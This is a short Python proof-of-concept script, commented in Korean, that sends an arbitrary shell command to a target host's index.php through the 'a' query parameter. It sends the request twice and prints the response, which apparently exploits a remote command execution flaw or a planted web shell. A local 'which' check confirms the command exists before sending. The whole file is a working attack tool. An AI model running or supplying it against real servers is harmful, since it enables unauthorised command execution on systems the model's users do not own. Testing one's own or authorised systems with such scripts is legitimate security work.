import sys
import subprocess
import requests

# 유효한 리눅스 명령어인지 확인
def is_linux_command(command):
    result = subprocess.run(['which', command], text=True, capture_output=True)
    return result.stdout.strip() != ''

# HTTP GET 요청
def send_http_request(host, port, command):
    url = f"http://{host}:{port}/index.php?a={command}"
    try:
        response = requests.get(url)
        response.raise_for_status()
        return response.text
    except requests.RequestException as e:
        return f"HTTP request ERROR: {e}"

def main():
    # 명령행 인자 검사하여 올바른 개수의 인자가 제공됐는지 확인
    if len(sys.argv) != 4:
        print("Usage: python poc.py <host> <port> <command>")
        sys.exit(1)

    host = sys.argv[1]
    port = sys.argv[2]
    command = sys.argv[3]

    if is_linux_command(command):
        print(f"'{command}' is valid command.")
        print("----------URL request result----------")
        # 2번 이상 실행해야 명령어 결과 출력
        print(send_http_request(host, port, command))
        print(send_http_request(host, port, command))
    else:
        print(f"'{command}' is invalid command.")

if __name__ == "__main__":
    main()
